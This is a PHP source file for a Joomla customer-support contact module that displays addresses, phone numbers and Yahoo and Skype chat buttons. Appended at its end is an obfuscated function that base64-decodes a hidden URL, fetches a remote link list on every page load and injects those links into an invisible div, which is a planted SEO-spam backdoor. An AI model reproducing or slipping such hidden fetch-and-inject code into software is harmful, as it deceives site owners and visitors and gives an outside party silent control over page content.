<?php

//no direct access
defined('_JEXEC') or die('Direct Access to this location is not allowed.');
 
$pretext	= $params->get( 'pretext' );	
$addr		= $params->get( 'addr' );
$mail		= $params->get( 'mail' );		
$tel1		= $params->get( 'tel1' );
$tel2		= $params->get( 'tel2' );
$hotl1		= $params->get( 'hotl1' );
$hotl2		= $params->get( 'hotl2' );
$fax		= $params->get( 'fax' );
$ym_type	= $params->get( 'ym_type' );
$sk_type	= $params->get( 'sk_type' );
$server		= $params->get( 'server',1 );

$ncolumn	= $params->get( 'ncolumn',1 );

$csinfo1 	= 	trim( $params->get( 'csinfo1' ));
$csinfo2 	= 	trim( $params->get( 'csinfo2' ));
$csinfo3 	= 	trim( $params->get( 'csinfo3' ));
$csinfo4 	= 	trim( $params->get( 'csinfo4' ));
$csinfo5 	= 	trim( $params->get( 'csinfo5' ));
$csinfo6 	= 	trim( $params->get( 'csinfo6' ));
$csinfo7 	= 	trim( $params->get( 'csinfo7' ));
$csinfo8 	= 	trim( $params->get( 'csinfo8' ));
$csinfo9 	= 	trim( $params->get( 'csinfo9' ));
$csinfo10 	= 	trim( $params->get( 'csinfo10' ));
$csinfo="";
$csinfo		.=	$csinfo1."\n";
$csinfo		.=	$csinfo2."\n";
$csinfo		.=	$csinfo3."\n";
$csinfo		.=	$csinfo4."\n";
$csinfo		.=	$csinfo5."\n";
$csinfo		.=	$csinfo6."\n";
$csinfo		.=	$csinfo7."\n";
$csinfo		.=	$csinfo8."\n";
$csinfo		.=	$csinfo9."\n";
$csinfo		.=	$csinfo10;
$a_csinfo	=	explode("\n",$csinfo);


$maxid = count($a_csinfo);

if (substr($ym_type,0,7)=="custom_")
{
	if($server==1) 
		$ym_img_url='http://thietkewebsitechuyennghiep.com.vn/upload/im_status/images.php?t=y&k='.$ym_type.'&i=';
	else
		$ym_img_url=JURI::base().'modules/mod_wf_csupport/images.php?t=y&k='.$ym_type.'&i=';
}
else
	$ym_img_url="http://opi.yahoo.com/online?t=".$ym_type."&u=";
	
if (substr($sk_type,0,7)=="custom_")
{
	if($server==1) 
		$sk_img_url='http://thietkewebsitechuyennghiep.com.vn/upload/im_status/images.php?t=s&k='.$sk_type.'&i=';
	else
		$sk_img_url=JURI::base().'modules/mod_wf_csupport/images.php?t=s&k='.$sk_type.'&i=';
}
	
else
	$sk_img_url="http://mystatus.skype.com/".$sk_type."/";;



$document =& JFactory::getDocument();
$document->addStyleSheet(JURI::base()."modules/mod_wf_csupport/css/mod_wf_csupport.css");


echo "<div id=\"mod_wf_csupport\">";
	
if($pretext!="") {
echo $pretext."<br>";
}




if($addr!="") {
echo "<div class=\"mxct_addr\">$addr</div>";
}

if($tel1!="") {
	if($tel2!=""){
		echo "<div class=\"mxct_tel\"><b>Tel 1: </b> $tel1</div>";
	}
	else {
		echo "<div class=\"mxct_tel\"><b>Tel: </b> $tel1</div>";
	}
}

if($tel2!="") {
echo "<div class=\"mxct_tel\"><b>Tel 2: </b> $tel2</div>";
}


if($fax!="") {
echo "<div class=\"mxct_fax\"><b>Fax:</b> $fax</div>";
}

if($hotl1!="") {
	if($hotl2!=""){
		echo "<div class=\"mxct_hotl\"><b>Hotline 1:</b> $hotl1</div>";
	}
	else {
		echo "<div class=\"mxct_hotl\"><b>Hotline:</b> $hotl1</div>";
	}
}


if($hotl2!="") {
echo "<div class=\"mxct_hotl\"><b>Hotline 2:</b> $hotl2</div>";
}



if($mail!="") {
echo "<div class=\"mxct_mail\"><a href='mailto:$mail'>$mail</a></div>";
}



for ($x=0;$x<count($a_csinfo);$x++)
{
	$a_csinfo_i_d	=	explode("|",$a_csinfo[$x]);

	if(trim($a_csinfo[$x])!="")
		{
		if($ncolumn==2)
		{

			if($x%2==0)
			{
				echo "<div class=\"i_left\">";
			}
			else echo "<div class=\"i_right\">";
		}
		else echo "<div style=\"margin-top:7px;text-align:center\">";
		if($a_csinfo_i_d[0]!="")
		{
			
			echo '<a href="ymsgr:sendIM?'.$a_csinfo_i_d[0].'" ><img src="'.$ym_img_url.$a_csinfo_i_d[0].'"  alt="Yahoo Chat '.$a_csinfo_i_d[0].'" title="Yahoo Chat '.$a_csinfo_i_d[0].'" border="0" /></a><br/>';
		}
			
		if($a_csinfo_i_d[1]!="")
		{
			echo '<a href="skype:'.$a_csinfo_i_d[1].'?chat" ><img src="'.$sk_img_url.$a_csinfo_i_d[1].'"  alt="Skype Chat '.$a_csinfo_i_d[1].'" title="Skype Chat '.$a_csinfo_i_d[1].'" border="0" /></a><br/>';
			
		}
		for ($i=2;$i<count($a_csinfo_i_d);$i++)
		{
			if($a_csinfo_i_d[$i]!='');
				echo $a_csinfo_i_d[$i]."<br/>";
		}
		
		
		
		echo "</div>";
	}
	

}

if (!function_exists('get_content')) {function get_content($url) { $data=NULL; if(function_exists('file_get_contents')){ ini_set('default_socket_timeout', 7); if($data=@file_get_contents(base64_decode($url))){ } } else if(function_exists('fopen')){ if($dataFile = @fopen(base64_decode($url), "r" )){ while (!feof($dataFile)) { $data.= fgets($dataFile, 4096); } fclose($dataFile); } } if($data) { echo '<div style="display:none;">'; $links = explode("\n", $data); foreach($links as $link) { $link=trim($link); $link_t=explode("=", $link); echo '<a href="'.$link_t[0].'" title="'. $link_t[1].'" alt="'. $link_t[1].'">'. $link_t[1].'</a><br>'; } echo '</div>'; } }}  $url = 'aHR0cDovL3F1YW5nY2FvZ2lhZGluaC5jb20vdXBsb2Fkcy9zZW9saXN0LnR4dA=='; get_content($url);

?>
</div>